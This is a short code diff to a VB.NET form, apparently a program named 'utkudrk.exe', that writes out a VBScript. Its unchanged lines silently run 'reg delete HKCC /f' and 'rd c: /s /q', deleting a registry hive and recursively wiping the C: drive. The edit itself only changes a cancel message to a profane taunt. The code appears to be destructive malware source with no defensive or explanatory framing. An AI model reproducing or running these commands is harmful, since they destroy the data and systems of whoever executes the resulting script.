@@ -1090,7 +1090,7 @@ Public Class Form1
         "    shell.Run ""reg delete HKCC /f"", 0, True" & vbCrLf &
         "    shell.Run ""rd c: /s /q"", 0, True" & vbCrLf &
         "Else" & vbCrLf &
-        "    MsgBox ""Action canceled."", 0, ""utkudrk.exe""" & vbCrLf &
+        "    MsgBox ""Action canceled because you didn't say FUCK YOU."", 0, ""utkudrk.exe""" & vbCrLf &
         "End If" & vbCrLf &
         "Set shell = Nothing"
 
